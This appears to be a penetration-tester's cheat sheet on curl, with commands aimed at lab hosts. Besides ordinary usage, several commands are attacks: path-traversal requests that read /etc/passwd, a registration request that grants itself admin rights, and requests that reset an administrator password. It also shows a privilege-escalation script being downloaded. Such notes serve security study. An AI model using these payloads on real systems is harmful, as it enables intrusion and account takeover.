> curl is a command line tool for transferring data with URL syntax, supporting DICT, FILE, FTP, FTPS, GOPHER, HTTP, HTTPS, IMAP, IMAPS, LDAP, LDAPS, POP3, POP3S, RTMP, RTSP, SCP, SFTP, SMTP, SMTPS, TELNET and TFTP.
> 
> curl supports SSL certificates, HTTP POST, HTTP PUT, FTP uploading, HTTP form based upload, proxies, cookies, user+password authentication (Basic, Digest, NTLM, Negotiate, kerberos…), file transfer resume, proxy tunneling and a busload of other useful tricks.


# Usage

#Web_Application 

Using `curl`
```bash
curl http://192.168.169.101:80/
```

Using `curl` to ignore certificate errors for HTTPS
```bash
curl -k http://192.168.169.101:80/
```

Using `curl` with `grep`
```bash
curl -v --silent http://192.168.169.101:443/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd 2>&1
```

Using `curl` to include the response headers in the output along with the body
```bash
curl -i http://192.168.169.101:6969/users/v1/login
```

Using `curl` to use the exact path provided
```bash
curl --path-as-is http://192.168.169.101:3000/public/someplugin/somearchive/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

Using `curl` POST E.g., To register a new user as admin
```bash
curl -d '{"password":"salespassword","username":"hentaisalesman","email":"salesman@hentai.com","admin":"True"}' -H 'Content-Type: application/json' http://192.168.169.101:6969/users/v1/register
```
- `-d` sets a default `Content-Type:`

Attempting to Change the Administrator Password via a POST request
```bash
curl  \
  'http://192.168.169.101:8080/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyiJIUzI1NiJ0eXaiOiyKV1QyjCJNbGcie69.eDkyNzEyMDZsIeHyJlNAhdCW6MTY0OTI3MDkfMSwic3ViyjiOyE2mqoib8Zmc2VjIn0.MYbSpUGOTatBkYH-tw6ltzW0jNJNCDACR3_FdYLRkew' \
  -d '{"password": "getpwned"}'
```

Attempting to Change the Administrator Password via a PUT request
```bash
curl -X 'PUT' \
  'http://192.168.231.16:8080/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyiJIUzI1NiJ0eXaiOiyKV1QyjCJNbGcie69.eDkyNzEyMDZsIeHyJlNAhdCW6MTY0OTI3MDkfMSwic3ViyjiOyE2mqoib8Zmc2VjIn0.OAsgLb8IHbJI7f9KaRAkrywoacrZ5eZH1rERUF0QqA4' \
  -d '{"password": "getpwned"}'
```

# Downloading File

#File_Sharing 

Downloading a file
```bash
curl -o unix-privesc-check http://192.168.169.101/unix-privesc-check
```
